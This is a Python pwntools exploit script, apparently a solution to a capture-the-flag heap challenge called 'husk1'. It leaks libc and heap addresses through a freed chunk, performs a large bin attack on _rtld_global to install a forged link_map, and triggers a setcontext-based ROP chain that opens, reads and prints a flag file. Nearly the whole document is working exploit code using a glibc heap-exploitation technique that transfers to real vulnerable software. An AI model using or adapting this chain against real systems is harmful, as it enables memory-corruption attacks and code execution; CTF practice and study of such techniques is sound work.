#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './husk1'

context.os = 'linux'
context.log_level = 'debug'
if arch == 64:
    context.arch = 'amd64'
if arch == 32:
    context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    # gdb.attach(p,"b *$rebase(0xDB4C)\nb *$rebase()")
    # pause()


def add(size, content=''):
    p.sendlineafter('>>', '1')
    p.sendlineafter('Size:', str(size))
    if content != '':
        p.sendafter('Content:', content)


def delete(index):
    p.sendlineafter('>>', '2')
    p.sendlineafter('Index:', str(index))


def show(index):
    p.sendlineafter('>>', '3')
    p.sendlineafter('Index:', str(index))


def edit(index, content):
    p.sendlineafter('>>', '4')
    p.sendlineafter('Index:', str(index))
    p.sendafter('Content:', content)


add(0x520, 'a'*0x520)  # 0
add(0x428, 'b'*0x428)  # 1
add(0x500, 'c'*0x500)  # 2
add(0x420, 'd'*0x420)  # 3

delete(0)

add(0x600, 'c'*0x600)  # 4
add(0x600, 'c'*0x600)  # 5

show(0)
p.recvuntil('Content: ')
libc.address = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00'))-0x1eb010
log.success("libc.address: "+hex(libc.address))
main_arena_xx = libc.address+0x1eb010
global_max_fast = libc.address + 0x1edb78
log.success("global_max_fast: "+hex(global_max_fast))
rtl_global = libc.address + 0x225060
log.success("rtl_global: "+hex(rtl_global))
set_context = libc.sym['setcontext'] + 61
log.success("set_context: "+hex(set_context))
ret = libc.sym['setcontext'] + 0x14E
log.success("ret: "+hex(ret))
pop_rdi = libc.address + 0x00000000000277e9
binsh = next(libc.search(b'/bin/sh'))
log.success("binsh: "+hex(binsh))
system = libc.symbols["system"]
log.success("system: "+hex(system))
# print hex(libc_base + 0x2043ac)

edit(0, 'a'*0x10)
show(0)
p.recvuntil('a'*0x10)
heap_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('heap_addr: ' + hex(heap_addr))
edit(0, p64(main_arena_xx)*2) #! 修复


#未归位的 large bin
delete(2)
delete(4)

#* 控制large bin 的 bk_nextsize 
edit(0,p64(0) + p64(0) + p64(0) + p64(rtl_global - 0x20))

#* raw_input()
debug()
add(0x600,b'large bin attack!!')

pop_rdi_ret = 0x26bb2+libc.address
pop_rsi_ret = 0x2709c+libc.address
pop_rax_ret = 0x28ff4+libc.address
pop_rdx_r12_ret = 0x11c3b1+libc.address
fake_link_map_addr = heap_addr + 0x960
payload = p64(0) + p64(libc.address + 0x226730) + p64(0) + p64(heap_addr + 0x960) 
#! 将l_next需要还原 l_real设置为自己伪造的link_map堆块地址
payload += p64(set_context) + p64(ret)

flag_addr = fake_link_map_addr + 0xe8
payload += p64(pop_rdi_ret) + p64(flag_addr) # fake_link_map_addr + 0x40
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(2)
payload += p64(libc.sym['syscall'] + 27)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(fake_link_map_addr + 0x200)
payload += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
payload += p64(libc.sym['read'])
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(libc.sym['write']) # fake_link_map_addr + 0xc8
payload += p64(libc.sym['_exit'])
 
payload = payload.ljust(0x28 + 0xa0, b'\x00') # => fake_link_map_addr + 0xd8  SROP 0xc8
payload += p64(fake_link_map_addr + 0x40) # rsp
payload += p64(ret) # rip
payload += b'./flag\x00\x00' # fake_link_map_addr + 0xe8


payload = payload.ljust(0x100,b'\x00')
payload += p64(fake_link_map_addr + 0x110) + p64(0x10)
# payload += p64(heap_addr + 0x960 + 0x10 + 0x110) + p64(heap_addr + 0x960 + 0x10 + 0x110)
#* 0x555555605d10 l->l_info[26] l->l_info[27] l->l_info[28] 
#* array = (l->l_addr + l->l_info[27]) 0x555555605C10+0x555555605d10
payload += p64(fake_link_map_addr + 0x120) + p64(0x10) #* l->l_info[29]
payload = payload.ljust(0x308,b'\x00')
payload += p64(0x800000000)
edit(2,payload)

edit(1,b'b'*0x420 + p64(fake_link_map_addr + 0x20))

#getshell
p.sendlineafter('>>','5')
p.sendlineafter('name:','haivk')

p.interactive()